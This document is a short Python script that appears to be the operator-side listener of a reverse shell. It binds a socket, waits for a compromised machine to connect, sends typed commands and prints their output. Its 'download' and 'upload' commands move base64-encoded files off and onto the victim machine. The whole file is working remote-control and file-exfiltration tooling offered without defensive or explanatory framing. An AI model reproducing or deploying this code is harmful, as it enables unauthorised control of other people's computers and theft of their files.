import socket
import base64

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listener.bind(('127.0.0.1', 12345)) # Your IP
listener.listen(1)

print("\n[+] Waiting connections...\n")

connection, address = listener.accept()
print(f"[!] {address[0]} Connected!")

while True:
    command_input = input(">> ")

    if command_input == "":
        pass

    elif command_input == "exit":
        command_send = connection.send(command_input.encode())
        break

    elif command_input[:8] == "download":
        connection.send(command_input.encode())
        with open(command_input[9:], 'wb') as file_download:
            data = connection.recv(1000000)
            file_download.write(base64.b64decode(data))

    elif command_input[:6] == "upload":
        try:
            connection.send(command_input.encode())
            with open(command_input[7:], 'rb') as file_upload:
                connection.send(base64.b64encode(file_upload.read()))
        except:
            print("[!] Error!")
    

    else:
        command_send = connection.send(command_input.encode())
        command_recv = connection.recv(4096).decode()
        print(command_recv)
